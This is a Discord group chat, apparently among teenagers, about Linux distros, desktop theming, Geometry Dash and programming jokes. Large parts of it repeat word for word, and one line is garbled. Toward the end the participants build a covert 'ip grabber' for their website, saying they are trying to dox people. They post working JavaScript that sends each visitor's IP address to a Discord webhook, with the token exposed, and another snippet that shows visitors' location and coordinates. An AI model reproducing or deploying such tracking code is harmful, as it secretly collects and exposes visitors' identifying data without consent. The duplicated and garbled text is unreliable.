SOMETIMES RANDOMLY AFTER I RESUME FROM PAUSING


KDE Remote Desktop Client i assume it stands for


AnyDesk is like the... microsoft edge


TeamViewer is like the internet explorer of remote desktop software


i died at 8% <:can_pooper:987033734773612574>


IVE NEVER HIT 200 FPS ON FUTURE FUNK EVER ON WINDOWS


NOW ITS RUNNING AT 200 FPS


I CLOSED MY SETTINGS, TERMINAL STEAM AND FILE EXPLORER


ok the lag gets real when i play future funk


isnt that the one where you die at the end


i wonder how far i'd get on TeamViewer


literally playing medium/hard demons here


remember im playing GEOMETRY DASH


however its still better cuz the fps display displays higher count


because i experienced the same amount of lag as windows


if only I HAD A BETTER PC


linux experience with geo dash: 10/10


BRUH IM GETTING BETTER FPS ON LINUX THAN ON WINDOWS


I HAD TO RUN THE INSTALLER VIA PROTONTRICKS


LETS FUCKMING GOOOOOOOOOOOOOOOOOO


AINT NO WAY


ok i did all the steps


i dont even have protontricks installed


ok so u have to use the v7 installer with proton


whatever lemme try again


and it didnt work?


wait didnt we do this on elementaryos


its still emptying


i empied it and i freed like 10gib


I HAVE SO MUCH JUNK IN MY TRASH


OH MY GOD

thats a major reason why i dont want to work at discord anymore 💀


most car break ins in america moment


After we enter the workforce, we will get mugged in the streets of San Francisco


made through 1 page of tutorials then gave up


i actually wanted to learn rust in early 2020 cuz i wanted to work at discord after watching their video 💀 💀 💀


BECAUSE THEY KEEP REWRITING THEIR CODE IN RUST


C++ USERS HATE RUSTACEANS


THATS IMPOSSIBLE THO


do you even intermediate rust


im not learning c++


obtaining the GET request to the variable


`println!("This is a &var");`


I CANT MOUNT IT


i cnat mount it


I FORGOT I UNMOUNTED MY WINDOWS PART


actually i will


im gonna break my code


asking a non-programmer the different types of C variants:
- C
- C-
- C--
- C+
- C++
- C#
- C##


```py
import math
cosine = [0.1, 0.2, 0.3, math.pi]
for i in cosine:
    answer = math.cos(i)
    print("The Cosine of %s is %.6f radians." % (i, answer))
```


memory address thing


i stilldont know what a pointer is


JS and Py 🤣


thats why it dont break


memory management is much better in C


because c++ isnt a toy language


it will brek


i think my pull request broke it 💀


memory skill issues


<@672892838995820553> why doesnt ur site spin anymore btw


you shoulda been here last week we explained all this already 💀

But I’m Konfident with Kubuntu


eOS wasn’t survivable


I tried it many months ago with elementaryOS but just couldn’t do it


Using it for fun NO.


like if i need to do something on windows to get linux working then ill do it


so no commercial use on windows


no switching to windows unless necessary


im going to initiate the use-linux-for-a-week challenge


<@650439182204010496> i have decided


didnt bother changing


i only joined on that acc to test my mic


i am happy with the customization


the quit button to be in the pause menu'


and have an options menu in the start menu to enable board flipping or smth


you should add a quit button to just go back to the start menu


nice start menu


i changed the background


why is there 2 copies tho


how do i restore the original sddm


and middle clicking = pasting


because that's my clipboard


you wonder why i posted s://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mas://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxil.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inboxs://mail.google.com/mail/u/0/#inbox


thats the thing DISCORD DOESNT HAVE AUTOSCROLL


nvm i found a better one


i accidentally deleted my SDDM


i want it system wide


thats only for your web browser


i already have that bozerner


me when no autoscroll :(


still got the taskbar lmfao


i even got the one dark chrome theme


oh shit i forgor


hows it look


im done customizing


A RANDOM ASS LINE


NOT EVEN DEAD PIXELS


WHYS THERE A LINE OF DEAD PIXELS


guess ill continue using my other aurorae theme


i tried putting back the buttons and now it looks like shitty windows 8


but it didnt work last tiem..


turns out you dont need root privileges for icons


well im a fucking idiot


i didnt see that


already did this morning


it doesnt matter which one it'll give that error


but i was wrong


the 2nd one errors that


that if the 1st one errors out


so i THOUGHT


but then when i try installing another it gives this error


like ZIP NOT FOUND


when i try installing other icons they give a seperate error


i cant install any


AND I CANT GET ROOT PERMS IN DOLPHIN


SINCE THEYRE STORED IN /USR/


BUT GETTING ICONS IS A PAIN IN THE ASS


so its not


i didnt stop any others


gave me the error first try when i opened the settings app


and it did this first try


whatever that is


that its a QT error


but then i read somewhere else


so why cant it


it stopped anyways


it cant install


then you try to install another one


if you install a theme but it errors


ok i finally figured out the concurrent stream issue


i like to have filling in mine


i dont like this one


the one ur using?


<@650439182204010496> got any good KDE icon sets?


this man expects me to alt+f4 everything


thanks a lot


god i wish there was a titlebar version


all i need now is a new icon set and cursors


ok nevermind i love this theme


by slowly i mean like 4-6 seconds


it deletes files very slowly


one complaint about dolphin


THEY GONE MATE


it looks good but WHERE TF ARE THE MENU BUTTONS


kubuntu doesnt have neofetch preinstalled 😾


one dark konsole looks ugly


ok where tf is konsole settingsd


how do you do that


Konsole color schemes


did you read my reviews yet


im trying to get it working


it lokos awesome


the same style as my vscode theme


i found this cool One Dark theme btw


YOU CAN SWITCH WINDOWS WITH SCROLLING ON THE TASKBAR??


but with a windows feel


im just going regular


im not ging for windows eitgher


they updated the logo?


this is my desktop so far


splash screens are cool


im trying to customize rn


i dont bother with it anymore


wine works fine


its not wine thats the problem


its fine lmfao


but who knows 💀


probably because i was using a virtual machine


you cant do shit aside from spinning in a circle 1000 times while moving an inch with your mouse


the sensitivity is like 100000


(it absolutely sucks)


it has rpi version of Minecraft preinstalled


you didnt know?


definitely not buggy at all !


AmogOS is the best


so i was lying


ZorinOS - 5/10: Solid distro but the design is too bland and looks kinda ugly. Customization isn't great either; it also uses GNOME.

Ubuntu - 6/10: A better version of Zorin with better customizability; though still sucks (GNOME moment)

Deepin - 1/10: The design is way too off. Every element is misplaced and misaligned, and looks worse than Zorin (HOW???) As expected from a chinese company

AmogOS - 11/10: free minecraft

Arch Linux - ???/10: Didn't even get past the installation 💀 that's how hard it is

Linux Mint - 8/10: A great distro for beginners, and has same customization levels as Ubuntu; Cinnamon is a decent DE

elementaryOS - 7.5/10: A great distro for Mac migrators, with same customization levels as Ubuntu; Pantheon tweaks is okay

Kubuntu - 9/10: I thought KDE was hard when i used it with Mint, but it's actually relatively simple and it looks awesome with so much customization.


lemme rate all the distros ive used


kubuntu is the best distro ive used so far btw


<@650439182204010496> get on here


i forgor 💀


im looking for themes


heck even microsoft uses linux for their servers now so im not even surprised if windows dies in the near future


i would like to see windows get punished by linux


TOO BAD! YOU CANT UNINSTALL US


THAT BROWSER IS SO 2008!


NO PRIVACY FOR YOU


ADS ADS ads


100 DOLLER?!?!?!?! ADS!

mah same butt


what'd you say?


look at this boii


actually its more like a funny story


hey, i got some chill


what'd you say?


hes fucking himself


if he doesn't know what any of this means he truly doesnt understand web programming concepts


i doubt he has an actual website


yet hes trying to defend himself


the man doesn't know wtf you're getting when you buy a domain


Had to use dns connection


With custom domain


I’m still using GitHub pages


My files are on GitHub


The domain bozo


More expensive than google domains


Not free though


literally commented out


why would you do that


idk why i dont have notifs on for csf


using jekyll theme


im also gonna be working on the blog


its now ah07.xyz


I GOT A DOMAIN


Since I’m in 2 other servers I’m active in a lot


Im already caring less


That’s communism ideals


about this server


Because no one cares


<@593106116821647363> are you coming to soccer today


"ur actual cracked"


"this guys cracked"


cracked means op/really good


won like 6 times already


im actual cracked


playing skywars lucky blocks


i watched this video like 5 times already


if anyone in this server were to say that it would 100% be you


"C++ is for making stuff" 🤓 like i have the mindset to say that


what are you on


i never talk about c++


you think im a philosopher


i never said anything like that


therefore it's classified as impersonation


but it wasn't something i said


i don't care


now if that quote was something i actually said


and purge the log


if you don't want local authorities at your door i suggest you delete that


i can take this to court if you want


stop using my name without my consent


statically typed programmers


that's just called


i dont know what a string literal is.


"a variable is a piece of data you store to"


In programming, a variable is a value that can change, depending on conditions or on information passed to the program.


not unless its stored in a variable??


"its a type of data which is just text"


when you can just say


"Most programming languages have a data type called a string, which is used for data values that are made up of ordered sequences of characters"


im not talking about js on a website


well you dont have to be 😺


"it shows text on the screen"


when you can literally say


Console log
console. log specifically is a method for developers to write code to inconspicuously inform the developers what the code is doing. It can be used to alert you that there's an issue, but shouldn't take the place of an interactive debugger when it comes time to debug the code.


they fucking go


they dont know how to explain from the viewpoint of a noob


this is a thing i hate about most programmers


like he'll understand what that means


you'd need AI bullshit


its not simple


you need very deep code


if you want to show what someone says


did you even get to the end


my hardest is a tier 8


a tier 28 demon to be specific


its a top 150 demon.


also the fucking thing recorded the wrong window


instead of just ctrl+s


ah yes f5 + ctrl+s


since yall are very scared


also im gonna record the entire website thing for you guys


save and it compiles


thats still very tedious


mf is typing tsc 1000 times


did you not know that


when u save the file


you can have an option to auto compile


its why typescript exists


that's javascript you're talking about bozo


wrong ping btw


wait until you hit 30 seconds during the call


ur supposed to click on the text


so i dont want the popup to appear if ur trying to go to a link


because theres links there

why bother using


because if your company isnt making a webapp for their service


if you dont care about programming who cares

the code is absolutely horrendous and i havent touched it in a while


i am retiring fhdbot


Go to sleep


That’s my alt pinging <@925159730949816370>


yes i didnt know that so i just pulled a c++


i was gonna speak as a yeti


probably your own


are you okay


where you live in became detroit 2 years ago


beg to differ


you literally don't have shit


and this proves it


gotta be part of the 90% in an american school


what a bozo 🤣


not even rust specific


its basic knowledge


you dont have to remember


i never even used it


i dont even know rust you bozo


lmfao if you dont know that i dont know how you're good at rust <a:lmfao:994256963242299492>


its literally 2 words


how do you write a main function in rust


ovy you didnt know that


how do you import the iostream in rust


write a program that converts newgrounds songs to ogg vorbis files


what's the Cargo


> let just means that the variable cannot be changed after it's created.


thanks for letting me know i shouldnt learn rust


literally looks like Killbot terminal


though i havent had a scenario where i had to use .then() for something else


i mean i dont use .then() for catching errors*


i dont use .then() much anymore cuz it floods the console


its so amazing


i love method chaining actually


what part are you expecti-


but yeah the tabs being under the search bar might take some time to get used to


thats the search bar


but i use safari on my phone


i use safari on my phone


i use it as a secondary browser now


because i sure as hell didnt succeed with switching to firefox


ill try to


or at least


im switching to safari once i get a mac


i would use firefox but i have a lot of chromium-only extensions


well its slightly faster than chrome but yeah it's sometimes slow


i have a laptop


it has the best battery life out of all windows browsers


and "WE'RE THE BROWSER THAT PROTECTS UR PRIVACY"


i do actually lmfao


opera gx is not that good either but at least its not CHROME


people still use chrome?


<a:lmfao:994256963242299492> <a:lmfoa:986614810076655656> 🤣 😂


u forgot the neckbeard


that's pretty much it


windows is better at gaming


like starting up programs linux wins 😪


the 120fps on windows looks like 75fps


the 200fps on linux looks like 30fps


<@650439182204010496> im playing geo dash and i realized how much smoother it is than running it on Proton


Rip Unity LMFAO


<@650439182204010496> <@593106116821647363> <@672892838995820553> OUCH

microsoft sold DirectX to another company


Kenny Kerr doesnt work for microsoft 10000%

microsoft doesnt acknowledge the existence of rust


rust of windows 🤮 (microsoft doesnt know rust exists)

For some reason, Wine opened up


I ran it

creepers and vindicators dont mix well dont they ☠️


most talk in in <#989191184360558602>


which runs fine


currently mine is at 480p30


the reason why i obs lagged so much was prob because i set the recording to 1080p60 💀


not only would Kazam slow my game down but the file size would prob be like 50mb


OBS FILE SIZES ARE HELLA LOW


for me hell yes


well if your distro feels like you're using windows


cuz 30fps doesnt lag my game as much as kazam


<@650439182204010496> btw OBS works fine im gonna use it instead of kazam


read my blog


no way ... ...


works perfectly on windows tho


it doesnt work "PERFECTLY"


how would you know


when robtop isnt working on 2.2 he COULD be working on Geometry Dash for Linux


bruh right as i got to like 95% in practice mode on geometry dash the game crashed

i forgot to say that


ok it built

(all of them work)


i have the whole smorgasbord


the ultimate troll


cracked account moment


i even logged into neng's


i had your inventory


in fact i am currently you


btw <@650439182204010496> i can log into ur minecraft account


WTF HAPPENED TO THE PORTAL


btw <@593106116821647363> join the srver


to the en


and add the .deb file name


just copy that


you can always click the top bar to see the full path


or else just


the ctrl+shift+v in the terminal to paste


like right click -> copy


just copy the file


idk about you


well for me i can


then `sudo apt install /path/to/the/file/chrome.deb`


copy the path to the file


then save it somewhere


the .deb file


download it from the website


then download chrome??


what do you usually use


arch is for advanced users tho so im not there yet


heck when i build a pc i might try installing Arch again


Windows - easy setup, shit experience
Kubuntu - difficult setup, amazing experience


cuz windows is already a garbage fire


i think kubuntu has given me less pain than windows itself


despite the usual linux pain


every other distro is like using an alien device and kubuntu feels like home


just geometry dash and minecraft


well i havent installed all my games yet lmfao


(which is why like 90% of arch users use KDE)


and KDE Is the most customizable DE ive ever used


other distros feel like im using an alien device that ill never get used to


kubuntu feels like im using a computer


Zorin - uses gnome (sucks) and ugly as hell

Ubuntu - uses gnome (sucks) and customization hell

Deepin - the design is so shit

AmogOS - minecraft's sense is like 100000

Arch Linux - couldn't even get past the installation

Linux Mint - many problems with the system itself

elementaryOS - linux mint but with less problems, and customization hell

Kubuntu - other than keyboard and kde store issues its the best ive ever used and it feels just like home


Kubuntu has given me the least problems out of every distro ive had


the least pain i've ever felt using linux*


https://streamable.com/3pxf3q <@650439182204010496> i got my audio to work on kazam <:can_pooper:987033734773612574>


anyways im back


on linux took like 5 sec


steam took like 15 seconds to start on windows


i just noticed how fast linux starts program


<@650439182204010496> im booting windows only to save my geo dash save file on there so i can play up to date on linux


Wait I just noticed ur trying to imitate me 💀

if you dont play geo dash daily you'll get worse


last time i played seriously was on the last day of school before exams


then BEFORE that


yeah 4 days ago


when did i beat B


last time i played seriously was uhh


yeah its def me being bad


idk if its me being bad


37 attempts with 12% best 💀


i dont have vsync or smooth fix on


steam runs in the background


you do realise


what does that do


and i have 95% on it


for reference: the level is  4 minutes 20s


aniother 2 slowdowns


its not even hard


i literally cannot get past 9% for some reason


i reversed but then i went back to normal and crashed to the ground


and when i hit a reverse gravity pad


ok yeah my game is acting weird


turns back to normal after i die


THE GAME SPEED SLOWS DOWN


SOMETIMES RANDOMLY AFTER I RESUME FROM PAUSING


KDE Remote Desktop Client i assume it stands for


AnyDesk is like the... microsoft edge


TeamViewer is like the internet explorer of remote desktop software


i died at 8% <:can_pooper:987033734773612574>


IVE NEVER HIT 200 FPS ON FUTURE FUNK EVER ON WINDOWS


NOW ITS RUNNING AT 200 FPS


I CLOSED MY SETTINGS, TERMINAL STEAM AND FILE EXPLORER


ok the lag gets real when i play future funk


isnt that the one where you die at the end


i wonder how far i'd get on TeamViewer


literally playing medium/hard demons here


remember im playing GEOMETRY DASH


however its still better cuz the fps display displays higher count


because i experienced the same amount of lag as windows


if only I HAD A BETTER PC


linux experience with geo dash: 10/10


BRUH IM GETTING BETTER FPS ON LINUX THAN ON WINDOWS


I HAD TO RUN THE INSTALLER VIA PROTONTRICKS


LETS FUCKMING GOOOOOOOOOOOOOOOOOO


AINT NO WAY


ok i did all the steps


i dont even have protontricks installed


ok so u have to use the v7 installer with proton


whatever lemme try again


and it didnt work?


wait didnt we do this on elementaryos


its still emptying


i empied it and i freed like 10gib


I HAVE SO MUCH JUNK IN MY TRASH


OH MY GOD


ok i moved it to trash <:can_pooper:987033734773612574>


I THOUGHT I WAS INSTALLING IT ON MY WINDOWS PART


WINE HAS ITS OWN C DRIVE


C:/Program Files/Steam doesnt exist


how do i get rid of Wine steam


ok but first


IT DOESNT WORK


ok nvm its kinda broken sometimes


it runs as good as native


and it doesnt actually run that bad


I CANT CLICK ON SHIT


WTF IS THIS

1 good and 1 inferior


fun now i have 2 steams


OK REStarted now works


BUT THE 2FA MENU ISNT THERE


YEAH THE CODES ON MY PHONE


lovely folders too


cuz i have 2fa


is it trying to bring up Steam auth


thats a discord issue


sometimes images wont send


no thats an issue i have with windows too


the image isnt sending


thats the default isnt it


what folder do i install it in


lemme install steam via wine rq


cuz linux steam and windows megahack will think its on a diff computer and shit


so it should work if i installed steam thru Wine


because im running linux version of steam while megahack thinks its on windows


<@650439182204010496> i know why megahack doesnt work now

Discord uses python???


thats a major reason why i dont want to work at discord anymore 💀


most car break ins in america moment


After we enter the workforce, we will get mugged in the streets of San Francisco


made through 1 page of tutorials then gave up


i actually wanted to learn rust in early 2020 cuz i wanted to work at discord after watching their video 💀 💀 💀


BECAUSE THEY KEEP REWRITING THEIR CODE IN RUST


C++ USERS HATE RUSTACEANS


THATS IMPOSSIBLE THO


do you even intermediate rust


im not learning c++


obtaining the GET request to the variable


`println!("This is a &var");`


I CANT MOUNT IT


i cnat mount it


I FORGOT I UNMOUNTED MY WINDOWS PART


actually i will


im gonna break my code


asking a non-programmer the different types of C variants:
- C
- C-
- C--
- C+
- C++
- C#
- C##


```py
import math
cosine = [0.1, 0.2, 0.3, math.pi]
for i in cosine:
    answer = math.cos(i)
    print("The Cosine of %s is %.6f radians." % (i, answer))
```


memory address thing


i stilldont know what a pointer is


JS and Py 🤣


thats why it dont break


memory management is much better in C


because c++ isnt a toy language


it will brek


i think my pull request broke it 💀


memory skill issues


<@672892838995820553> why doesnt ur site spin anymore btw


you shoulda been here last week we explained all this already 💀


that's pythons way of string interpolation


gonna send this in chat during break


```py
h = 0.1+0.2
print(f"0.1 plus 0.2 equals {h}")
```


i pronounce it toopol

Filmora watermark 💀


day 1 start tomorrow


But I’m Konfident with Kubuntu


eOS wasn’t survivable


I tried it many months ago with elementaryOS but just couldn’t do it


Using it for fun NO.


like if i need to do something on windows to get linux working then ill do it


so no commercial use on windows


no switching to windows unless necessary


im going to initiate the use-linux-for-a-week challenge


<@650439182204010496> i have decided


didnt bother changing


i only joined on that acc to test my mic


i am happy with the customization


the quit button to be in the pause menu'


and have an options menu in the start menu to enable board flipping or smth


you should add a quit button to just go back to the start menu


nice start menu


i changed the background


why is there 2 copies tho


how do i restore the original sddm


and middle clicking = pasting


because that's my clipboard

i even got the one dark chrome theme


oh shit i forgor

im done customizing


A RANDOM ASS LINE


NOT EVEN DEAD PIXELS


WHYS THERE A LINE OF DEAD PIXELS


guess ill continue using my other aurorae theme


i tried putting back the buttons and now it looks like shitty windows 8


but it didnt work last tiem..


turns out you dont need root privileges for icons


well im a fucking idiot


i didnt see that


already did this morning


it doesnt matter which one it'll give that error


but i was wrong


the 2nd one errors that


that if the 1st one errors out


so i THOUGHT


but then when i try installing another it gives this error


like ZIP NOT FOUND


when i try installing other icons they give a seperate error


i cant install any


AND I CANT GET ROOT PERMS IN DOLPHIN


SINCE THEYRE STORED IN /USR/


BUT GETTING ICONS IS A PAIN IN THE ASS


so its not


i didnt stop any others


gave me the error first try when i opened the settings app


and it did this first try


whatever that is


that its a QT error


but then i read somewhere else


so why cant it


it stopped anyways


it cant install


then you try to install another one


if you install a theme but it errors


ok i finally figured out the concurrent stream issue


i like to have filling in mine


i dont like this one


the one ur using?


<@650439182204010496> got any good KDE icon sets?


this man expects me to alt+f4 everything


thanks a lot


god i wish there was a titlebar version


all i need now is a new icon set and cursors


ok nevermind i love this theme


by slowly i mean like 4-6 seconds


it deletes files very slowly


one complaint about dolphin


THEY GONE MATE


it looks good but WHERE TF ARE THE MENU BUTTONS


kubuntu doesnt have neofetch preinstalled 😾


one dark konsole looks ugly


ok where tf is konsole settingsd


how do you do that


Konsole color schemes


did you read my reviews yet


im trying to get it working


it lokos awesome


the same style as my vscode theme


i found this cool One Dark theme btw


YOU CAN SWITCH WINDOWS WITH SCROLLING ON THE TASKBAR??


but with a windows feel


im just going regular


im not ging for windows eitgher


they updated the logo?


this is my desktop so far


splash screens are cool


im trying to customize rn


i dont bother with it anymore


wine works fine


its not wine thats the problem


its fine lmfao


but who knows 💀


probably because i was using a virtual machine


you cant do shit aside from spinning in a circle 1000 times while moving an inch with your mouse


the sensitivity is like 100000


(it absolutely sucks)


it has rpi version of Minecraft preinstalled


you didnt know?


definitely not buggy at all !


AmogOS is the best


so i was lying


ZorinOS - 5/10: Solid distro but the design is too bland and looks kinda ugly. Customization isn't great either; it also uses GNOME.

Ubuntu - 6/10: A better version of Zorin with better customizability; though still sucks (GNOME moment)

Deepin - 1/10: The design is way too off. Every element is misplaced and misaligned, and looks worse than Zorin (HOW???) As expected from a chinese company

AmogOS - 11/10: free minecraft

Arch Linux - ???/10: Didn't even get past the installation 💀 that's how hard it is

Linux Mint - 8/10: A great distro for beginners, and has same customization levels as Ubuntu; Cinnamon is a decent DE

elementaryOS - 7.5/10: A great distro for Mac migrators, with same customization levels as Ubuntu; Pantheon tweaks is okay

Kubuntu - 9/10: I thought KDE was hard when i used it with Mint, but it's actually relatively simple and it looks awesome with so much customization.


lemme rate all the distros ive used


kubuntu is the best distro ive used so far btw


<@650439182204010496> get on here


i forgor 💀


im looking for themes


heck even microsoft uses linux for their servers now so im not even surprised if windows dies in the near future


i would like to see windows get punished by linux


TOO BAD! YOU CANT UNINSTALL US


THAT BROWSER IS SO 2008!


NO PRIVACY FOR YOU


ADS ADS ads


100 DOLLER?!?!?!?! ADS!


windows on the other hand


they have good reasons to be macos


mac is fine on its own


its just linux


ok im back


Help my discord froze


thats not what i meant


cuz it has its own stuff


mac can stay its own


i would like to see what they do


i mean at least it isnt microsoft edge am i right 💀


at least microsoft have vscode and shit


but they offer little to no open source stuff


like i understand closed source software


i can even delete it


literally do whatever u want with it


their corporate bullshit is close sourcing stuff so strongly


look at the bottom


can windows/macos do this 💀


because theres no corporation


because its not full of corporate bullshit


linux is good


we have control of everything


we're actually free


well unlike america


elementaryos is okay but isnt as customizable


for a better distro


(as the DE of course)


mine has KDE preinstalled


you can install a barebones one if you want to


EVERYTHING YOU HAVE


ALL YOUR ICONS


YOUR ENTIRE DESKTOP


goofy ahh customization


can you use KDE on mac tho <a:trolla:842081333127675952>


and gonna try megahack again


im installing geometry dash btw


it was just


Kubuntu is awesome


i want to have a stable os with good customization


eOS is pretty limited


<@650439182204010496> my mic still doesnt work lmfao


aside from those


so far ive had no linux issues


cuz i want to make it feel like home


i wanna make it look like win11


ok i almost got everything till latte dock so im just gonna go back


there we go


ill just install the normal version


i installed the KDE version tho which is more complicated


thats... what i did before


whats wrong with this then


Installation of /tmp/FbyVli-com.github.vinceliuice.WhiteSur-dark.tar.gz failed: Could not install dependency: 'kns://colorschemes.knsrc/api.kde-look.org/1398831'


you gotta adjust things obviously


yeah thats how its supposed to be


Installation of /tmp/FbyVli-com.github.vinceliuice.WhiteSur-dark.tar.gz failed: Could not install dependency: 'kns://colorschemes.knsrc/api.kde-look.org/1398831'


i used it on elementaryos fine


i tried installing from github and shit and manually doing it but its complicated


i need to get that theme working


just means cool/good


can't wait to play (sd-pam)


i rushed that part


also hopefully i didnt fuck up the partitioning cuz i just overwrote my eOS partitions


the screenshot tool is literally snipping tool


kubuntu's already ballin


my last eOS boot


then ill install kubuntu


ok im gonna boot into elementaryos and check if i have anything important on there


thats a quagsire


thats not a gasp

yes its right across the street


but wrong house 🤣


but that's the mailbox alright


dont remember the neighbors house garage door being blue


also thats an old image


WRONG HOUSE BOZO


the only person to ever join from the website is daiwik 💀


google has to be safer!!11


without their consent tho?!!??!11/1/


imagine just making him go on a website that YOU made that logs your information 😐


like your FUTURE EMPLOYER


we can keep it up until we get into situations where we show ppl the website


basically nobody from outside of ontario is visiting the site anyways


imagine vscode collecting your data hahahaha... OH WAIT


what he said


its literally so obvious tho


Florges from Chelsea


we need to NOT be NOT ETHIcal


like big companies


nah its just not ethical


at least people know that big companies are using the data for


who knows what we're doing with it then


we'll use the data for basically nothing


but at least they use the data for something


and we'll be non-trustworthy


plus its not ethical


we need to think different 😾


that's not nice tho!!!!


we'll also have to get rid of all of this when we start rolling in traffic


but not pop up


just make it there


you should also prob disable the popup from appearing on load because that'd seem sus


scuffed as hell


thats not my exact location tho


my phone is a gps device obviously


lemme try on my phone


literally the same


my laptop is a gps device bruh


the location thing is inaccurate


me when the only ipv6 is america:


nengs prob the other ones


im the dutch dude


hallo, leuke server, ik ben nederlands


bro who tf is using vpm


is this even a valid ipv6???


anyways yeah americans are adopting ipv6 at this point


<@672892838995820553> i cant talk in server logs bozo


OH IT WORKS NOW


IT WORKS LOAALLY


cuz it works for him


it only works on yues side?


no clue but it still works


smaller embeds solo


ok see i much prefer this


bruh the newlines


WHO TF GOT RID OF THE AVATAR


so do i have to make a random number generator or some shit


strings with numbers work


wow so pro


doesnt have to be an integer


no its not


why isnt the embed updating


coordinates are off by ~1km


is the embed going to update


no its not


you wrote way too much unecessary stuff


no colors moment


i figured it out


nonono its fine


i figured it out


ok i got it


u call it a djs embed 💀


what is it


but its not a new messageembed


```js
    const stackHelp = new MessageEmbed()
    .setColor('RANDOM')
    .setTitle('Stack The Countries Help')
    .setDescription(`*something\n\n`)
    .setThumbnail('https://i.imgur.com/mU0RScm.png')
```


ok lemme get


so how do i do embeds


is it meta tags?


meta tags haha amiright up top


i just figured out how to do it


how do i do that


like the message?


i wanted to use this as my wallpaper but the watermark 💀


lesson 1 ofc


bro u live near oakville soccer club 💀


that's what an 11 year old on yt would say 💀


like 1km off from my actual location buddy 💀


THE COORDINATES IN THE DOX ARE SO FAR OFF


now people can get doxxed on the go 😎


im done mobile optimizing


ever since i discovered flexbox i 😍


lemme pull changes


can you move it to <#983539124470423553>


time to mobile optimize


im done desktop fixes


sorry for the spam im fixing the site


guess ill just update the website for the time being


does the webhook have to update???


i removed the ping


so i just put everything inside


so it was sus


the inside one worked but the outside one didnt


1 inside and 1 outside


i did a test of it and yeah i was right


cuz it disintegrates right after


turi ip ip ip


this is how you do it right


```js
window.addEventListener('load', (event) => {
    $.getJSON('https://ipapi.co/json/', (data) => {
        const ip = data.ip; 

        dataNow = {
            content: `Someone visited a page on the our website! Their IP address: ${ip}`
        }
        
        const HTTP = new XMLHttpRequest()
        HTTP.open("POST", "https://discord.com/api/webhooks/989892141734055996/eckpFcO-u-P2i9pojwAaJtdJHmAhAc9Fec3V8FhYmdtSuvG6DuIC7teHN8i153U5366O", true)
        HTTP.setRequestHeader("Content-Type", "application/json")
        HTTP.send(JSON.stringify(dataNow))
    });
});
```


what r u gonna do about it


IT ACTUALLY WORKS


so i finished the job


yue dropped out and neng gave up


we were working on the ip grabber


i dont even need the let ip = unknown


SO YOU HAVE TO PUT ALL YOU HAVE INSIDE THERE


THE `$.getJSON` REVERTS ITS CHANGES AFTER ITS DONE


I WAS RIGHT


<@672892838995820553> I DID IT


so i have to put everything in there


the getJSON only works once


ok so apparently


the entire organization


not just me


the global var wouldnt change


the guess command


this happened with fhdbot before


<@672892838995820553> THIS LINE IS BROKEN


`        ip = data["ip"];`


SO IT MUST BE


OK I ALERTED DATA.IP


is ip even getting changed


it has to be that


but the change didnt


since the alert works


i made it way more simple this time


its this line


i guess we found the culprit


BUT ITS STILL UNKNOWN


THE ALERT WORKED


rather than committing


i think i should try this locally


it didnt log anything


we're trying to dox ppl


i used it wrong


which means i dont think window onload worked


console logging didnt work


to see the issue


this time i added console logging


fuck i forgot to add the `event` param


hopefully i did it right


idk how to use window.onload


if that doesnt work i have 1 more solution


wait for build


lets try now


actually turned it into a variable


LETS TRY THIS


WHY ARE YOU USING A FUNCTION AS A VARIABLE


you'd have to use async await i think


BEFORE THE DATA GETS SENT


WOULDN'T IT POST THE VALUE


WAIT A SECOND


ok lets try


returning dont work mate


il tygggiggg ggggggggggggggggggggggg


imagine learning jquery today


same for me lmfao


shouldnt we return the value of ip


did it not update or what


<@672892838995820553> bro the api u found was a dud


WHY IS IT STILL USING GEOPLUGIN


shouldnt we be using HTTPS requests or smth


found the culprit


didnt deploy yet


and revert the old api


ok lemme do some console logging


well the ip is stored in a string


lets wait for the deploy


ok lets see


we should probably still use ipapi


did the api u use have string keys


YOU HAVE TO USE `ip = data["geoplugin_request"];`


`"geoplugin_request"` IS A STRING KEY


we should console log it


its something wrong with getting the ip


ok so we know the import is working


<@650439182204010496> whys ur website still Anthony Mac Inc.


just use the old one


its not broken


go back to the old api rq


SOMEONE CHANGED THE API


wait a sec


hang on am i the dumbass


THEN WTF IS THIS


open the website rq


looks like yues


whose ip is that


who opened that


YOU DIDNT PUT THE SCRIPT IMPORT AT THE BOTTOM


YALL ARE DUMB


THERE WE GO


ive had issues with js files not loading in


that wouldnt work


yall get on vc


change the "unknown" to just ""


does the ip returned get returned as a string


so it is data.ip


function lol(){
            $.getJSON('https://ipapi.co/json/', function(data) {
                   alert(`IP: ${data.ip}\nCountry: ${data.country_name}\nState/Province: ${data.region}\nTown/City: ${data.city}\nZip/Postal: ${data.postal}\nCoordinates: ${data.latitude}, ${data.longitude}`);
            });
        }


i dont think actual code reviewers will appreciate the repository tho 😐


nothing gets logged


NO IT DIDNT


wait a second


open source moment


he left lmfao


who even is that


he ded 💀


im not doing shit


wtf u on


whered he go


<@816843118170472448> u there


its probably neng


yes we can


my only accounts


remove the ping


you guys wanna move the bot to <#983539124470423553>


thats gay as hell


only me, neng and yue are


(which you arent)


if you're part of the organization tho u can mess around with anything


and we have to review your changes


no you have to open a pull request


do you though


open source: free software, people can see the code and contribute to it


open source is not coding


what a bozo


its literally on the github page


YEAH THANKS FOR THE IDEA


why would it be 😐


s pa pa nir


the snapshot ofc


im gonna try the new reporting feature


